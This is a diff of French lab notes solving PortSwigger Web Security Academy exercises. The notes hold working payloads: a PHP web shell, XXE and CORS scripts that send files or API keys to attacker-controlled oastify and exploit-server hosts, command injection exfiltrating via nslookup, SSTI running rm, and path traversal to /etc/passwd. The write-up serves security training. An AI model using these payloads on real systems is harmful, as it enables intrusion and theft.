@@ -226,157 +226,6 @@ Payload final :
     <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
 
 
-## === Server-side vulnerabilities ===
-
-### File path traversal, simple case
-
-    GET /image?filename=../../../etc/passwd
-
-### File path traversal, traversal sequences blocked with absolute path bypass
-
-	GET /image?filename=/etc/passwd
-    
-### File path traversal, traversal sequences stripped non-recursively
-
-	GET /image?filename=....//....//....//etc/passwd
-    
-### File path traversal, traversal sequences stripped with superfluous URL-decode
-
-	GET /image?filename=..%252f..%252f..%252fetc/passwd
-    
-### File path traversal, validation of start of path
-
-	GET /image?filename=/var/www/images/../../../../../etc/passwd
-    
-### File path traversal, validation of file extension with null byte bypass
-
-	GET /image?filename=../../../etc/passwd%00.png
-    
-### Unprotected admin functionality
-
-	GET /robots.txt
-	GET /administrator-panel
-	GET /administrator-panel/delete?username=carlos
-    
-### Unprotected admin functionality with unpredictable URL
-
-Observer le code-source de la page et remarquer cette partie : 
-	
-> adminPanelTag.setAttribute('href', '/admin-vnq2da');
-
-	GET /admin-vnq2da
-	GET /admin-vnq2da/delete?username=carlos
-    
-### User role controlled by request parameter
-
-	GET /admin
-
-Aller sur la page de login, puis commencer à intercepter les requêtes ET les réponses (“Proxy settings” => “Intercept reponses based on the following rules:”). 
-
-Se connecter sur cette page avec les credentials d’utilisateur simple donnés dans la consigne.
-
-Changer “Cookie: session=VrbUBr7c6DzenjfmQuOIDax5UndrINrK; Admin=false” en 
-“Cookie: session=VrbUBr7c6DzenjfmQuOIDax5UndrINrK; Admin=true” dans la réponse puis dans chaque requête que l’on va effectuer avec cet utilisateur simple.
-
-### User ID controlled by request parameter, with unpredictable user IDs
-
-Aller sur n’importe quel article posté par Carlos et observer le paramètre “userId=d22a802d-ac88-48ff-b237-c137214a0f89” dans l’URL.
-
-Se connecter avec le compte utilisateur fourni dans la consigne puis reprendre ce paramètre et le mettre dans l’URL suivante à la place du nôtre : 
-https://0a98001b04df8474826c92e2004700dc.web-security-academy.net/my-account?id=fc22df53-bdc5-484b-9c5b-8f1b952d4f5a 
-
-### User ID controlled by request parameter with password disclosure
-
-Se connecter sur la page de login avec le compte utilisateur fourni dans la consigne.
-
-Aller dans l’onglet “My account” et changer le paramètre de l’URL en “Administrator” : 
-
-    GET /my-account?id=administrator
-
-Observer le code HTML de la réponse obtenue, le mot de passe se trouve dans un formulaire caché : 
-
-    <input required type=password name=password value='wz5ub7i9y4vqvcspqek2'/>
-
-### Username enumeration via different responses
-
-Lancer un Intruder pour déduire le vrai nom (Length 3250 vs Length 3248).
-Lancer un deuxième Intruder avec le nom pour bruteforcer le login.
-
-### 2FA simple bypass
-
-Se connecter sur la page de login avec le compte fourni dans la consigne.
-Aller sur l’onglet “Email client” pour réceptionner le 2FA.
-Entrer le 2FA pour terminer l’authentification avec le premier compte.
-Remarquer que l’URL se termine par “/my-account?id=wiener”.
-
-Se connecter avec les credentials de la victime.
-
-Quand le 2FA est demandé pour la victime, remplacer la fin de l’URL par “/my-account?id=carlos” et relancer la page.
-
-### Basic SSRF against the local server
-
-La page https://0a48007504a4974a81a78eee00540025.web-security-academy.net/admin est réservée aux administrateurs.
-
-Utiliser la fonction “Check stock” sur n’importe quel article et l’intercepter sur Burp. 
-
-Changer le paramètre “stockApi=XXX” de cette requête POST en “stockApi=http://localhost/admin” 
-
-Dans le code de la réponse on peut remarquer : 
-
-    <a href="/admin/delete?username=carlos">
-
-Reproduire la même interception de requête mais cette fois avec “stockApi=http://localhost/admin/delete?username=carlos”
-    
-### Basic SSRF against another back-end system
-    
-Utiliser la fonction “Check stock” sur n’importe quel article et l’intercepter sur Burp. 
-
-Changer le paramètre “stockApi=XXX” de cette requête POST en “stockApi=http://192.168.0.1:8080/admin” puis faire une attaque de 1 à 255 sur le dernier octet de l’IP avec l’Intruder.
-
-Noter l’IP qui donne accès à la page d’administration et reproduire la requête dans le Repeater : 
-“stockApi=http://192.168.0.41:8080/admin/delete?username=carlos “
-
-### OS command injection, simple case
-
-Utiliser la fonction “Check stock” sur n’importe quel article et l’envoyer sur le Repeater.
-
-Remplacer “productId=2&storeId=1” par “productId=2&storeId=1;whoami”
-
-### Remote code execution via web shell upload
-
-Se connecter sur la page /my-account et changer d’avatar. D’abord choisir une image classique. 
-
-Une fois l’image uploadée, rafraîchir pour regarder son compte et observer la requête avec Burp. Remarquer le morceau suivant : 
-
-    <img src="/files/avatars/Portrait_of_Friedrich_Nietzsche.jpg" class=avatar>
-
-Changer d’avatar une deuxième fois et mettre un webshell PHP classique à la place : 
-
-    <?php echo system($_GET['command']); ?>
-
-Exécuter le webshell en allant sur l’URL trouvée à partir de l’image : 
-
-> https://0a31007e03aad04685695dc0002c00cf.web-security-academy.net/files/avatars/Webshell.php?command=ls
-
-> https://0a31007e03aad04685695dc0002c00cf.web-security-academy.net/files/avatars/Webshell.php?command=cat%20/home/carlos/secret 
-
-### Web shell upload via Content-Type restriction bypass
-
-Tenter de déposer le même webshell que pour le lab précédent.
-
-On voit cette erreur : 
-
-“Sorry, file type application/octet-stream is not allowed 
-Only image/jpeg and image/png are allowed 
-Sorry, there was an error uploading your file.”
-
-Sur Burp, prendre la requête POST et la transférer au Repeater.
-
-Remplacer “Content-Type: application/octet-stream” par “Content-Type: image/jpeg” et la renvoyer
-
-Aller sur l’URL permettant d’interagir avec le webshell : 
-
-> https://0a4700d2034ad0458506767700390095.web-security-academy.net/files/avatars/Webshell.php?command=cat%20/home/carlos/secret 
 
 
 ## === Cross-site scripting ===
@@ -410,6 +259,7 @@ Envoyer le payload suivant dans la barre de recherche :
 ### DOM XSS in innerHTML sink using source location.search
 
 Entrer n’importe quoi dans la barre de recherche.
+
 Remarquer le morceau suivant dans le code source :
 
     <h1><span>0 search results for '</span><span id="searchMessage"></span><span>'</span></h1>
@@ -764,19 +614,24 @@ Aller sur n'importe quel post du site et mettre un commentaire avec le payload s
 
 ### (EXPERT) Reflected XSS with event handlers and href attributes blocked
 
-    https://0a8f002704b50f3e83acec0b00cb0070.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
+https://0a8f002704b50f3e83acec0b00cb0070.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
 
 ### (EXPERT) Reflected XSS in a JavaScript URL with some characters blocked
 
-    https://0a61006b0327942c816a7fab008c0040.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+https://0a61006b0327942c816a7fab008c0040.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
 
 ### (EXPERT) Reflected XSS protected by very strict CSP, with dangling markup attack 
 
-TO DO 
+TO DO
+
+Une XSS se trouve dans le paramètre "email" de la fonctionnalité de changement d'adresse.
+
+
 
 ### (EXPERT) Reflected XSS protected by CSP, with CSP bypass
 
 https://0a81002b0431f3f3817103770080005a.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27 
+
 
 
 ## === CSRF ===
@@ -960,3 +815,924 @@ Payload final :
     </script>
     
 Il faut bien ajouter le paramètre "submit", et encoder le caractère '&' sous peine de sortir du paramètre "postId".
+
+### SameSite Strict bypass via sibling domain
+
+Envoyer des messages dans le chat et observer les websockets qui passent.
+XXX TO DO
+
+
+### SameSite Lax bypass via cookie refresh
+
+X
+
+### CSRF where Referer validation depends on header being present
+
+X
+
+### CSRF with broken Referer validation
+
+
+## === Clickjacking ===
+
+### Basic clickjacking with CSRF token protection
+
+X
+
+### Clickjacking with form input data prefilled from a URL parameter
+
+X
+
+### Clickjacking with a frame buster script
+
+X
+
+### Exploiting clickjacking vulnerability to trigger DOM-based XSS
+
+X
+
+### Multistep clickjacking
+
+
+
+
+## === DOM-based vulnerabilities ===
+
+### DOM XSS using web messages
+
+On remarque le morceau suivant dans le code source de la page d'accueil : 
+
+    <script>
+        window.addEventListener('message', function(e) {
+        document.getElementById('ads').innerHTML = e.data;
+        })
+    </script>
+
+Mettre le payload suivant dans le serveur d'exploitation : 
+
+    <iframe src="https://0afd00f00393bec681dfe97200090073.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+
+
+### DOM XSS using web messages and a JavaScript URL
+
+Même principe qu'avant mais on a cette fois une vérification très précaire : 
+
+    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
+        location.href = url;
+    }
+
+Cette vérification peut facilement se contourner en mettant une de ces deux valeurs en commentaire.
+
+Mettre le payload suivant dans le serveur d'exploitation :
+
+    <iframe src="https://0ab500a403ba994980dd177d00440017.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
+
+### DOM XSS using web messages and JSON.parse
+
+Observer le morceau suivant dans le code source de la page d'accueil :
+
+    window.addEventListener('message', function(e) {
+                var iframe = document.createElement('iframe'),
+                    ACMEplayer = {
+                        element: iframe
+                    },
+                    d;
+                document.body.appendChild(iframe);
+                try {
+                    d = JSON.parse(e.data);
+                } catch (e) {
+                    return;
+                }
+                switch (d.type) {
+                    case "page-load":
+                        ACMEplayer.element.scrollIntoView();
+                        break;
+                    case "load-channel":
+                        ACMEplayer.element.src = d.url;
+                        ...
+                        
+Mettre le payload suivant dans le serveur d'exploitation : 
+
+    <iframe src=https://0a080090048210ca8a2785df00280005.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
+
+
+### DOM-based open redirection
+
+Observer le morceau suivant dans le code source de la page de n'importe quel article : 
+
+    <div class="is-linkback">
+        <a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
+    </div>
+
+Il s'agit donc d'une simple redirection à injecter dans l'URL : 
+
+    https://0a75009503d9c09d840573430015008f.web-security-academy.net/post?postId=4&url=https://exploit-0a3800f70389c09484ab725301290099.exploit-server.net/
+
+
+### DOM-based cookie manipulation
+
+En utilisant la fonctionnalité "Last viewed product", on observe que le dernier produit visité est stocké dans un cookie : 
+
+>Cookie: session=sIQQUgYkG5gRoFzGXAW2nzaF9yBRh407; lastViewedProduct=https://0aba0028033eb0f382ac292800cb00a7.web-security-academy.net/product?productId=4
+
+Mettre le payload suivant dans le serveur d'exploitation : 
+
+    <iframe src="https://0aba0028033eb0f382ac292800cb00a7.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0aba0028033eb0f382ac292800cb00a7.web-security-academy.net';window.x=1;">
+
+
+### Exploiting DOM clobbering to enable XSS
+
+### Clobbering DOM attributes to bypass HTML filters
+
+
+## === Cross-origin resource sharing (CORS) ===
+
+Headers à tester dans la requête : 
+
+- Origin: abc.com
+- Origin: null
+- Origin: http://sous-domaine.site_cible.com
+
+
+### CORS vulnerability with basic origin reflection
+
+Cas le plus simple d'un site web mal configuré et acceptant toutes les origines.
+
+Avec le chemin "/my-account?id=wiener" on peut voir notre propre clé API
+
+En regardant l'historique sur Burp, on voit que cette requête est un "**GET /accountDetails**" et que sa réponse contient le header suivant : 
+
+>Access-Control-Allow-Credentials: true
+
+
+Cela signifie que les requêtes CORS venant du domaine source (l'origine) spécifié dans l'en-tête **Origin** peuvent inclure des informations d'identification.
+
+On peut donc reprendre le bout de code Javascript donné dans l'explication précédant le lab et l'adapter à ce cas : 
+
+    <script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://0a60001c04ac505180dc269700f0000b.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='https://exploit-0a7500b9040050d5808625b8012100c7.exploit-server.net/log?key='+this.responseText;
+    };
+    </script>
+    
+    
+    
+Ce code doit être mis dans le serveur d'exploitation pour que la victime clique dessus.
+
+
+### CORS vulnerability with trusted null origin
+
+Pour ce cas, le site est mieux configuré mais a whitelisté l'origine "null", ce qui peut être utile pendant une phase de développement en local par exemple.
+
+En incluant notre script dans une iframe, on lui donnera une origine "null" et on pourra donc contourner cette configuration.
+
+
+    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+        var req = new XMLHttpRequest();
+        req.onload = reqListener;
+        req.open('get','0a340009031740fb824ab59c008c00f4.web-security-academy.net/accountDetails',true);
+        req.withCredentials = true;
+        req.send();
+        function reqListener() {
+            location='https://exploit-0a0600bd032540598200b4a0013500e5.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+        };
+    </script>"></iframe>
+
+
+
+### CORS vulnerability with trusted insecure protocols
+
+Cas de figure d'un site bien configuré mais qui accepte en origine un autre site vulnérable et joignable en HTTP. 
+
+Dans le cadre de ce lab il n'est pas possible de faire du MITM et il faut donc trouver une alternative pour injecter le code dans le sous-domaine.
+
+En fouillant le site, on voit que la fonctionnalité "Check stock" des différents produits ouvre une nouvelle fenêtre dont l'URL est du type "stock.0a4b002104e86a5c861a42de009200bd.web-security-academy.net/?productId=1&storeId=1"
+
+On tient donc un sous-domaine.
+
+En jouant avec la requête de vérification du stock, on peut voir que le premier paramètre est vulnérable à une XSS : 
+
+    GET /?productId=<s>1</s>&storeId=<s>1</s> HTTP/1.1
+
+><h4>ERROR</h4>Invalid product ID: <s>1</s>
+
+
+En poussant cette XSS plus loin, on peut donc l'utiliser pour faire une requête vers le site principal afin de récupérer la clé API de l'administrateur de la même manière que dans les autres labs.
+
+Code à envoyer dans le serveur d'exploitation pour que la victime clique : 
+
+    <script>
+    document.location="http://stock.0a4b002104e86a5c861a42de009200bd.web-security-academy.net/?productId=1<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a4b002104e86a5c861a42de009200bd.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0ac1009004dc6a8286884148014100c3.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+    </script>
+
+
+### CORS vulnerability with internal network pivot attack
+
+
+
+## === XML external entity (XXE) injection ===
+
+### Exploiting XXE using external entities to retrieve files
+
+En utilisant la fonction "Check stock" sur n'importe quel produit, on voit que les données transmises sont envoyées au format XML.
+
+En modifiant le XML avec un payload de XXE classique, on obtient une erreur 400 dont le contenu contient le fichier /etc/passwd : 
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+    <stockCheck>
+    <productId>&xxe;</productId>
+    <storeId>1</storeId>
+    </stockCheck>
+
+### Exploiting XXE to perform SSRF attacks
+
+Même principe qu'au-dessus mais avec un payload de SSRF : 
+
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+    <stockCheck>
+    <productId>&xxe;</productId>
+    <storeId>1</storeId>
+    </stockCheck>
+    
+Le chemin se retrouve étape par étape à partir de la racine puisque le nom des sous-dossiers est renvoyé à chaque fois. 
+
+
+### Blind XXE with out-of-band interaction
+
+Même principe qu'au-dessus mais avec une adresse extérieure que l'on contrôle :
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "https://p3t5kp5y5jwxzw5c6zfp9zt3muslgb40.oastify.com">]>
+    <stockCheck>
+    <productId>&xxe;</productId>
+    <storeId>1</storeId>
+    </stockCheck>
+
+
+### Blind XXE with out-of-band interaction via XML parameter entities
+
+Même principe qu'au-dessus mais avec les entities classiques bloquées : 
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "https://5pvl65rerzidlcrssf15vffj8ae12sqh.oastify.com"> %xxe; ]>
+    <stockCheck>
+    <productId>%xxe;</productId>
+    <storeId>1</storeId>
+    </stockCheck>
+
+
+### Exploiting blind XXE to exfiltrate data using a malicious external DTD
+
+Héberger un DTD externe permet de rendre possible l'exfiltration de données dans le cadre d'une blind XXE. L'exfiltration peut toutefois échouer si il y a des caractères de type retour à la ligne dans le fichier, c'est pourquoi **/etc/hostname** peut être un bon premier test alternatif à **/etc/passwd**
+
+
+Code à héberger sur le serveur d'exploitation :
+
+
+    <!ENTITY % file SYSTEM "file:///etc/hostname">
+    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://jczc6bq6dhues5s3n5he15eev51wpmdb.oastify.com/?x=%file;'>">
+    %eval;
+    %exfil;
+
+
+
+Payload à ajouter au contenu XML de la fonction "Check stock" de n'importe quel produit : 
+
+    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a14001303ee106c83b0721e01c5004a.exploit-server.net/exploit.dtd"> %xxe;]>
+
+
+On reçoit bien le contenu du fichier /etc/hostname en paramètre de la requête HTTP au Collaborator
+
+### Exploiting blind XXE to retrieve data via error messages
+
+
+Code à héberger sur le serveur d'exploitation :
+
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+    %eval;
+    %error;
+
+Payload à ajouter au contenu XML de la fonction "Check stock" de n'importe quel produit :
+
+    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a0500eb04db14228550570e015a0065.exploit-server.net/exploit.dtd"> %xxe;]>
+
+
+On reçoit bien le contenu du fichier /etc/passwd dans le corps de la page de l'erreur 400 obtenue
+
+
+### Exploiting XInclude to retrieve files
+
+L'exemple du cours fonctionne directement mais il faut bien l'ajouter comme valeur du paramètre **productId** : 
+
+
+    productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
+
+
+### Exploiting XXE via image file upload
+
+
+    <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+Le contenu du fichier se retrouve dans l'image après le processing de cette dernière, il faut retourner sur notre profil et regarder l'avatar.
+
+### Exploiting XXE to retrieve data by repurposing a local DTD 
+
+TO DO 
+
+
+
+## === Server-side request forgery (SSRF) ===
+
+### Basic SSRF against the local server
+
+La page https://0a48007504a4974a81a78eee00540025.web-security-academy.net/admin est réservée aux administrateurs.
+
+Utiliser la fonction “Check stock” sur n’importe quel article et l’intercepter sur Burp.
+
+Changer le paramètre “stockApi=XXX” de cette requête POST en “stockApi=http://localhost/admin” 
+
+Dans le code de la réponse on peut remarquer : 
+
+    <a href="/admin/delete?username=carlos">
+
+Reproduire la même interception de requête mais cette fois avec “stockApi=http://localhost/admin/delete?username=carlos”
+    
+### Basic SSRF against another back-end system
+    
+Utiliser la fonction “Check stock” sur n’importe quel article et l’intercepter sur Burp. 
+
+Changer le paramètre “stockApi=XXX” de cette requête POST en “stockApi=http://192.168.0.1:8080/admin” puis faire une attaque de 1 à 255 sur le dernier octet de l’IP avec l’Intruder.
+
+Noter l’IP qui donne accès à la page d’administration et reproduire la requête dans le Repeater : 
+“stockApi=http://192.168.0.41:8080/admin/delete?username=carlos “
+
+### Blind SSRF with out-of-band detection
+
+Cas d'un site qui utilise une fonction reprenant l'URL spécifiée dans le header "Referer" lorsque la page d'un produit est chargée.
+
+    Referer: https://8bkxox7z6q7ahaebmc9l18ou7ldc19py.oastify.com
+    
+### SSRF with blacklist-based input filter
+
+En fouillant le site, on voit que la fonction "Check stock" présente sur tous les produits fait appel à une URL externe : 
+
+>stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
+
+En testant un appel sur Collaborator on a bien un retour : 
+
+>stockApi=https://q3ufgfzhy8zs9s6teu13tqgcz35utshh.oastify.com
+
+Toutefois, en essayant de supprimer Carlos comme demandé dans la consigne, on a une erreur de sécurité : 
+
+>http://localhost/admin/delete?username=carlos
+
+>"External stock check blocked for security reasons"
+
+Les payloads suivants semblent également bloqués : 
+
+    http://127.0.0.1/admin/delete?username=carlos
+    %68%74%74%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%2f%61%64%6d%69%6e%2f%64%65%6c%65%74%65%3f%75%73%65%72%6e%61%6d%65%3d%63%61%72%6c%6f%73
+    
+    http://127.1/admin/delete?username=carlos
+    %68%74%74%70%3a%2f%2f%31%32%37%2e%31%2f%61%64%6d%69%6e%2f%64%65%6c%65%74%65%3f%75%73%65%72%6e%61%6d%65%3d%63%61%72%6c%6f%73
+    
+    
+En revanche, en reprenant le deuxième payload mais avec un double encodage sur un caractère, on semble pouvoir contourner le filtre : 
+
+    http://127.1/%2561dmin/delete?username=carlos
+    
+
+### SSRF with filter bypass via open redirection vulnerability
+
+On a toujours la même fonction de vérification du stock, mais cette fois la page d'un produit contient aussi un bouton "Next product" pointant sur le produit suivant.
+
+La requête découlant de ce bouton est la suivante : 
+
+>GET /product/nextProduct?currentProductId=2&path=/product?productId=3 HTTP/2
+
+
+Sur la requête "**POST /product/stock**", en remplaçant le paramètre "**stockApi**" par le chemin de l'interface d'administration on retombe bien sur cette dernière, on peut donc exploiter l'open redirection pour supprimer Carlos facilement : 
+
+    stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
+
+
+### SSRF with whitelist-based input filter
+
+En essayant quelques payloads on a une erreur 400 explicite : 
+
+>"External stock check host must be stock.weliketoshop.net"
+
+
+
+## === HTTP request smuggling ===
+
+Bien désactiver l'option **Update Content-Length** dans les requêtes HTTP pour toute cette série de labs.
+
+### Confirming a CL.TE vulnerability via differential responses
+
+Utiliser l'extension "HTTP Request Smuggler" ou envoyer deux fois la requête suivante : 
+
+    POST / HTTP/1.1
+    Host: 0adf00df039a12ba80d74ebf007700f0.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 35
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /404 HTTP/1.1
+    X-Ignore: X
+
+
+
+### Confirming a TE.CL vulnerability via differential responses
+
+Utiliser l'extension "HTTP Request Smuggler" ou envoyer deux fois la requête suivante : 
+
+    POST / HTTP/1.1
+    Host: 0a88000304a0cd288184d42600ce0032.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-length: 4
+    Transfer-Encoding: chunked
+
+    5e
+    POST /404 HTTP/1.1
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 15
+
+    x=1
+    0
+
+
+
+### Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
+
+X
+### Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
+
+X
+
+### Exploiting HTTP request smuggling to reveal front-end request rewriting
+
+X
+
+### Exploiting HTTP request smuggling to capture other users' requests
+
+X
+
+### Exploiting HTTP request smuggling to deliver reflected XSS
+
+    POST / HTTP/1.1
+    Host: 0ad300b703e2e092814e708c00d10046.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 150
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /post?postId=5 HTTP/1.1
+    User-Agent: a"/><script>alert(1)</script>
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 5
+
+    x=1
+    
+    
+### Response queue poisoning via H2.TE request smuggling
+
+X
+
+### H2.CL request smuggling
+
+X
+
+### HTTP/2 request smuggling via CRLF injection
+
+X
+
+## === OS command injection ===
+
+### OS command injection, simple case
+
+Utiliser la fonction “Check stock” sur n’importe quel article et l’envoyer sur le Repeater.
+
+Remplacer “productId=2&storeId=1” par “productId=2&storeId=1;whoami”
+
+### Blind OS command injection with time delays
+
+    &email=x||ping+-c+10+127.0.0.1||
+    
+### Blind OS command injection with output redirection
+
+    &email=||whoami>/var/www/images/output.txt||
+
+Il faut ensuite récupérer le fichier grâce à la page de chargement des images des produits : 
+
+    curl https://0ab6004004c363198449041000fc00b5.web-security-academy.net/image?filename=output.txt
+    
+### Blind OS command injection with out-of-band interaction
+
+    &email=x||nslookup+x.211rerxtwkx47445c6zfr2eoxf36ryfn.oastify.com||
+
+### Blind OS command injection with out-of-band data exfiltration
+
+    &email=||nslookup+`whoami`.uywjbjultcuw4w1x9yw7oubgu70yosch.oastify.com||
+
+## === Server-side template injection ===
+
+Exemple de payload initial à tester : ${{<%[%'"}}%\
+
+### Basic server-side template injection
+
+En essayant de voir les détails du premier produit de la liste, on a une erreur "**Unfortunately this product is out of stock**" et on voit que cette erreur est reflétée dans le header "**Location**" de la réponse puis dans une **seconde requête GET** : 
+
+>Location: /?message=Unfortunately this product is out of stock
+>...
+>GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/2
+
+Dans la consigne, il est indiqué que ce lab tourne avec du Ruby / ERB.
+
+En testant un payload classique de SSTI pour Ruby, on a bien une évaluation : 
+
+>GET /?message=<%= 9*9 %> HTTP/2
+
+Payload à utiliser pour supprimer Carlos comme demandé : 
+
+>GET /?message=<%25%3d+system("rm+/home/carlos/morale.txt")+%25> HTTP/2
+
+
+### Basic server-side template injection (code context)
+
+Dans la consigne, il est indiqué que ce lab tourne avec du Tornado.
+
+Voir : https://ajinabraham.com/blog/server-side-template-injection-in-tornado
+
+Dans la requête de changement de format, on voit un paramètre potentiellement vulnérable aux SSTI : 
+
+    blog-post-author-display=user.first_name&csrf=3a2j2ElX1FPC5bifVQLZ0eJfo5hUZg5q
+
+Payloads utilisés : 
+
+    blog-post-author-display={{9*9}}
+    blog-post-author-display={{9*9}}{%%20import%20os%20%}{{os.popen(%22whoami%22).read()}
+    blog-post-author-display={{9*9}}{%%20import%20os%20%}{{os.popen(%22rm%20/home/carlos/morale.txt%22).read()}
+    
+
+### Server-side template injection using documentation
+
+Chaque produit a une fonctionnalité "Edit template" et cela permet de remarquer que le site utilise des templates de la forme ${XXX} : 
+
+><p>Hurry! Only ${product.stock} left of ${product.name} at ${product.price}.</p>
+
+En modifiant le dernier template par ${9*9} on a bien une évaluation.
+
+En modifiant le dernier template par ${AAAAA} on a une erreur donnant plus d'informations sur le back-end : 
+
+>FreeMarker template error (DEBUG mode; use RETHROW in production!): The following has evaluated to null or missing: ==> AAAAAAAAA [in template "freemarker" at line 4, column 62]
+>...
+
+Voir : https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#freemarker-java 
+
+Payloads utilisés : 
+
+    ${"freemarker.template.utility.Execute"?new()("id")}
+    ${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
+
+### Server-side template injection in an unknown language with a documented exploit
+
+En essayant de voir les détails du premier produit de la liste, on a une erreur "**Unfortunately this product is out of stock**" et on voit que cette erreur est reflétée dans le header "**Location**" de la réponse puis dans une **seconde requête GET** : 
+
+>Location: /?message=Unfortunately this product is out of stock
+>...
+>GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/2
+
+Fuzzing sur le message : 
+
+>GET /?message=${{<%[%'"}}%\
+
+On obtient une erreur révélant le back-end : 
+
+>/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267
+            throw new Error(str);
+>...
+>Node.js v19.8.1
+
+
+Voir : http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html
+
+Payload final à encoder et à mettre dans le paramètre : 
+
+    wrtz{{#with "s" as |string|}}
+        {{#with "e"}}
+            {{#with split as |conslist|}}
+                {{this.pop}}
+                {{this.push (lookup string.sub "constructor")}}
+                {{this.pop}}
+                {{#with string.split as |codelist|}}
+                    {{this.pop}}
+                    {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
+                    {{this.pop}}
+                    {{#each conslist}}
+                        {{#with (string.sub.apply 0 codelist)}}
+                            {{this}}
+                        {{/with}}
+                    {{/each}}
+                {{/with}}
+            {{/with}}
+        {{/with}}
+    {{/with}}
+
+### Server-side template injection with information disclosure via user-supplied objects
+
+Chaque produit a une fonctionnalité "Edit template" et cela permet de remarquer que le site utilise des templates de la forme {{XXX}}
+
+En provoquant une erreur dans un template on obtient le type de back-end : 
+
+>Traceback (most recent call last): File "<string>", line 11, in <module> File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 191, 
+>...
+
+Voir : https://docs.djangoproject.com/en/5.0/ref/settings/#secret-key 
+
+Payloads : 
+
+    {% debug %}
+    {{settings.SECRET_KEY}}
+
+## === Path traversal ===
+
+### File path traversal, simple case
+
+        GET /image?filename=../../../etc/passwd
+
+### File path traversal, traversal sequences blocked with absolute path bypass
+
+	GET /image?filename=/etc/passwd
+    
+### File path traversal, traversal sequences stripped non-recursively
+
+	GET /image?filename=....//....//....//etc/passwd
+    
+### File path traversal, traversal sequences stripped with superfluous URL-decode
+
+	GET /image?filename=..%252f..%252f..%252fetc/passwd
+    
+### File path traversal, validation of start of path
+
+	GET /image?filename=/var/www/images/../../../../../etc/passwd
+    
+### File path traversal, validation of file extension with null byte bypass
+
+	GET /image?filename=../../../etc/passwd%00.png
+
+
+## === Access control vulnerabilities === 
+
+### Unprotected admin functionality
+
+	GET /robots.txt
+	GET /administrator-panel
+	GET /administrator-panel/delete?username=carlos
+    
+### Unprotected admin functionality with unpredictable URL
+
+Observer le code-source de la page et remarquer cette partie : 
+	
